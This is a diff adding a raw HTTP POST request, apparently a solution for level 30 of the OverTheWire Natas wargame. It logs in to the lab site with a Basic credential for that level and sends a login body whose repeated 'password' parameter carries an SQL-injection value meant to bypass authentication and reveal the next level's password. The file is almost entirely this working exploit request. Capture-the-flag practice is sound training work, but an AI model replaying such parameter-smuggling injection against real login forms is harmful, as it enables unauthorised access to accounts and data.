@@ -1,0 +1,17 @@
+POST /index.pl HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en,fi-FI;q=0.9,fi;q=0.8,en-US;q=0.7
+Authorization: Basic bmF0YXMzMDpHejRhdDhDZE9ZUWtrSjhmSmFtYzExSmc1aE9uWE05WA==
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Cookie: __utma=176859643.1981211129.1690143695.1690143695.1690143695.1; __utmc=176859643; __utmz=176859643.1690143695.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Origin: http://natas30.natas.labs.overthewire.org
+Pragma: no-cache
+Referer: http://natas30.natas.labs.overthewire.org/index.pl
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Host: natas30.natas.labs.overthewire.org
+Content-Length: 51
+
+username=natas31&password='lol'%20or%201&password=4
